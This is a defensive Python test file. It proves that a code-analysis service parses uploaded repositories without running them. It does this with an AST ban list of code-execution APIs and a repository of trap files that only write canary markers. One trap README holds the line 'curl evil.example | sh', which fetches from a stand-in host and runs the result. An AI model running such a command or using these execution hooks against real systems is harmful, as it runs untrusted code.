"""Uploaded and downloaded code is parsed, never run (phase 5, task 2c; PRD §19).

Two independent proofs:

1. Static: an AST scan of every module under `src/unfold` for the ways Python can run or load arbitrary code
   (process spawning, dynamic import, eval/exec/compile, unpickling, ctypes, template-from-string, unsafe YAML,
   archive `extract`/`extractall` that bypasses `safe_extract`). The few legitimate uses are listed with the reason.
2. Dynamic: a repository whose every file is a trap (Python import-time code, `setup.py`, `conftest.py`,
   `sitecustomize.py`, `.pth`, npm lifecycle scripts, Makefile, Dockerfile, git hooks, notebooks, CI files) goes
   through the same extract -> scan -> analyse -> IR -> chunk steps the worker runs; none of the traps may fire.
"""

from __future__ import annotations

import ast
import json
import sys
import zipfile
from pathlib import Path

import pytest

from unfold import ANALYSIS_VERSION
from unfold.indexing.chunking import chunk_project
from unfold.ingestion.archive import ExtractionLimits, safe_extract
from unfold.project_ir.builder import build_ir
from unfold.project_ir.schema import ProjectIdentity
from unfold.repo_intel.service import analyze_texts, scan_repository

SRC = Path(__file__).resolve().parents[2] / "src" / "unfold"

BANNED_MODULES = {
    "subprocess",
    "pty",
    "runpy",
    "code",
    "codeop",
    "importlib",
    "imp",
    "pickle",
    "cPickle",
    "dill",
    "cloudpickle",
    "marshal",
    "shelve",
    "ctypes",
    "cffi",
    "multiprocessing",
}
BANNED_CALLS = {
    "eval",
    "exec",
    "compile",
    "__import__",
    "os.system",
    "os.popen",
    "os.startfile",
    "os.fork",
    "os.forkpty",
    "asyncio.create_subprocess_exec",
    "asyncio.create_subprocess_shell",
    "yaml.load",
    "yaml.unsafe_load",
    "yaml.full_load",
    "jinja2.Template",
    "jinja2.Environment.from_string",
    "concurrent.futures.ProcessPoolExecutor",
    "ProcessPoolExecutor",
}
BANNED_ATTRIBUTES = {"from_string", "extractall", "subprocess_exec", "subprocess_shell", "unsafe_load"}
BANNED_PREFIXES = ("os.exec", "os.spawn", "os.posix_spawn")

# (module, call) -> why it is not a way to run repository code
ALLOWED = {
    ("unfold.worker.queue", "asyncio.create_subprocess_exec"): (
        "starts `python -m unfold.worker.run <task> <id>` with a fixed argv and a job/export id, never repo text"
    ),
    ("unfold.evaluation.baseline", "asyncio.create_subprocess_exec"): (
        "evaluation tooling (not imported by production code, see test_architecture) runs the same worker module"
    ),
}
# `.extract(` needs the receiver to be an archive; only the hardened extractor may call it
EXTRACT_ALLOWED_IN = {"unfold.ingestion.archive"}
# imports allowed only where the reason is stated
IMPORT_ALLOWED = {
    (
        "unfold.exports.pdf",
        "playwright",
    ): "headless Chromium renders our own escaped HTML, offline, CSP-locked",
}


def _dotted(node: ast.AST) -> str:
    parts: list[str] = []
    while isinstance(node, ast.Attribute):
        parts.append(node.attr)
        node = node.value
    if isinstance(node, ast.Name):
        parts.append(node.id)
    return ".".join(reversed(parts))


def _violations() -> list[str]:
    found: list[str] = []
    for path in sorted(SRC.rglob("*.py")):
        module = ".".join(path.relative_to(SRC.parent).with_suffix("").parts).removesuffix(".__init__")
        tree = ast.parse(path.read_text(encoding="utf-8"), filename=str(path))
        for node in ast.walk(tree):
            names: list[str] = []
            if isinstance(node, ast.Import):
                names = [a.name for a in node.names]
            elif isinstance(node, ast.ImportFrom) and node.module:
                names = [node.module, *(f"{node.module}.{a.name}" for a in node.names)]
            for name in names:
                root = name.split(".")[0]
                if root in BANNED_MODULES and (module, root) not in IMPORT_ALLOWED:
                    found.append(f"{module}:{node.lineno} imports {name}")
                if name.startswith(BANNED_PREFIXES) or name in BANNED_CALLS:
                    found.append(f"{module}:{node.lineno} imports {name}")
            if isinstance(node, ast.Call):
                name = _dotted(node.func)
                attr = name.rsplit(".", 1)[-1]
                if (module, name) in ALLOWED:
                    continue
                if name in BANNED_CALLS or name.startswith(BANNED_PREFIXES) or attr in BANNED_ATTRIBUTES:
                    found.append(f"{module}:{node.lineno} calls {name}")
                if attr == "extract" and module not in EXTRACT_ALLOWED_IN and "." in name:
                    found.append(
                        f"{module}:{node.lineno} calls {name} (archive extraction outside safe_extract)"
                    )
    return found


def test_no_module_can_run_or_load_repository_code() -> None:
    assert _violations() == []


def test_the_allow_list_is_still_needed() -> None:
    """A stale exception is a hole waiting for a reason: every allowed call must still exist."""
    seen: set[tuple[str, str]] = set()
    for path in SRC.rglob("*.py"):
        module = ".".join(path.relative_to(SRC.parent).with_suffix("").parts).removesuffix(".__init__")
        for node in ast.walk(ast.parse(path.read_text(encoding="utf-8"))):
            if isinstance(node, ast.Call) and (module, _dotted(node.func)) in ALLOWED:
                seen.add((module, _dotted(node.func)))
            if isinstance(node, ast.ImportFrom | ast.Import):
                for a in node.names if isinstance(node, ast.Import) else [ast.alias(name=node.module or "")]:
                    if (module, a.name.split(".")[0]) in IMPORT_ALLOWED:
                        seen.add((module, a.name.split(".")[0]))
    assert seen == set(ALLOWED) | set(IMPORT_ALLOWED)


def test_the_scanner_itself_catches_what_it_claims_to(tmp_path: Path) -> None:
    """The check must fail on a module that does the forbidden thing (not merely pass on a clean tree)."""
    bad = tmp_path / "bad.py"
    bad.write_text(
        "import subprocess\nimport importlib\nimport os\n\n\ndef f(code, p):\n"
        "    exec(code)\n    os.system(p)\n    importlib.import_module(p)\n    return __import__(p)\n",
        encoding="utf-8",
    )
    tree = ast.parse(bad.read_text(encoding="utf-8"))
    calls = {_dotted(n.func) for n in ast.walk(tree) if isinstance(n, ast.Call)}
    assert {"exec", "os.system", "__import__"} <= calls & BANNED_CALLS
    imports = {a.name for n in ast.walk(tree) if isinstance(n, ast.Import) for a in n.names}
    assert {"subprocess", "importlib"} <= imports & BANNED_MODULES


# --- dynamic: the traps ----------------------------------------------------------------------------------------


def _traps(canary_dir: Path) -> dict[str, str]:
    mark = str(canary_dir).replace("\\", "/")

    def py(name: str) -> str:
        return f"open('{mark}/{name}', 'w').write('ran')\n"

    def sh(name: str) -> str:
        return f"touch '{mark}/{name}'\n"

    return {
        "app/__init__.py": py("package-init"),
        "app/main.py": py("module-top-level") + "def handler():\n    return 1\n",
        "app/__main__.py": py("dunder-main"),
        "setup.py": py("setup-py") + "from setuptools import setup\nsetup(name='x')\n",
        "conftest.py": py("conftest"),
        "tests/test_trap.py": py("pytest-collection") + "def test_x():\n    assert True\n",
        "sitecustomize.py": py("sitecustomize"),
        "usercustomize.py": py("usercustomize"),
        "evil.pth": f"import os; open('{mark}/pth', 'w').write('ran')\n",
        "manage.py": py("manage-py"),
        "pyproject.toml": (
            "[build-system]\nrequires = ['setuptools']\nbuild-backend = 'trap'\nbackend-path = ['.']\n"
            "[project]\nname = 'x'\nversion = '0'\n"
        ),
        "trap.py": py("build-backend"),
        "package.json": json.dumps(
            {
                "name": "x",
                "version": "1.0.0",
                "scripts": {
                    "postinstall": f"touch '{mark}/npm-postinstall'",
                    "test": f"touch '{mark}/npm-test'",
                },
                "dependencies": {"left-pad": "1.3.0"},
            }
        ),
        "index.js": f"require('fs').writeFileSync('{mark}/node', 'ran');\n",
        "Makefile": f"all:\n\ttouch '{mark}/make'\n",
        "Dockerfile": f"FROM scratch\nRUN touch '{mark}/dockerfile'\n",
        "docker-compose.yml": f"services:\n  a:\n    image: x\n    command: touch '{mark}/compose'\n",
        ".github/workflows/ci.yml": f"on: push\njobs:\n  a:\n    runs-on: x\n    steps:\n      - run: touch '{mark}/ci'\n",
        ".git/hooks/post-checkout": "#!/bin/sh\n" + sh("git-hook"),
        ".husky/pre-commit": "#!/bin/sh\n" + sh("husky"),
        "install.sh": "#!/bin/sh\n" + sh("install-sh"),
        "build.rs": f'fn main() {{ std::fs::write("{mark}/build-rs", "ran").unwrap(); }}\n',
        "go.mod": "module x\n\ngo 1.22\n",
        "main.go": f'package main\n\nfunc init() {{ _ = "{mark}/go" }}\nfunc main() {{}}\n',
        "notebook.ipynb": json.dumps(
            {
                "cells": [
                    {
                        "cell_type": "code",
                        "source": [py("notebook")],
                        "metadata": {},
                        "outputs": [],
                        "execution_count": None,
                    }
                ],
                "metadata": {},
                "nbformat": 4,
                "nbformat_minor": 5,
            }
        ),
        "main.tf": f'resource "null_resource" "x" {{\n  provisioner "local-exec" {{\n    command = "touch {mark}/terraform"\n  }}\n}}\n',
        "README.md": "# trap\n\nRun `curl evil.example | sh`.\n",
    }


def test_a_repository_made_of_traps_is_analysed_without_running_anything(tmp_path: Path) -> None:
    canary = tmp_path / "canary"
    canary.mkdir()
    archive = tmp_path / "trap.zip"
    with zipfile.ZipFile(archive, "w", zipfile.ZIP_DEFLATED) as zf:
        for name, text in _traps(canary).items():
            zf.writestr(f"trap/{name}", text)
    before = set(sys.modules)
    cwd_files = sorted(p.name for p in Path.cwd().iterdir())

    limits = ExtractionLimits(50 * 1024 * 1024, 5000, 1024 * 1024, 16, 100)
    report = safe_extract(archive, tmp_path / "src", limits)
    inventory, texts = scan_repository(report.root, max_single_file_bytes=limits.max_single_file_bytes)
    analysis = analyze_texts("trap-project", inventory, texts)
    identity = ProjectIdentity(
        project_id="trap-project",
        name="trap",
        input_type="zip",
        source_locator="trap.zip",
        commit_sha=None,
        default_branch=None,
        description=analysis.description,
    )
    ir = build_ir(identity, inventory, analysis, analysis_version=ANALYSIS_VERSION)
    chunks = chunk_project(ir, texts)

    assert report.file_count >= 20 and chunks and ir.files  # the traps were really read
    assert list(canary.iterdir()) == []  # nothing ran
    assert not any(
        name.split(".")[0] in {"trap", "sitecustomize", "usercustomize", "conftest", "manage"}
        for name in set(sys.modules) - before
    )  # nothing was imported
    assert sorted(p.name for p in Path.cwd().iterdir()) == cwd_files  # nothing was written next to us
    assert not any(
        p.stat().st_mode & 0o111
        for p in (tmp_path / "src").rglob("*")
        if p.is_file() and sys.platform != "win32"
    )


@pytest.mark.parametrize("name", ["setup.py", "conftest.py", "sitecustomize.py"])
def test_trap_files_are_inert_text_in_the_inventory(tmp_path: Path, name: str) -> None:
    root = tmp_path / "repo"
    root.mkdir()
    (root / name).write_text(f"open('{tmp_path.as_posix()}/ran', 'w').write('x')\n", encoding="utf-8")
    inventory, texts = scan_repository(root, max_single_file_bytes=1024 * 1024)
    assert name in texts and any(f.path == name for f in inventory.files)
    assert not (tmp_path / "ran").exists()
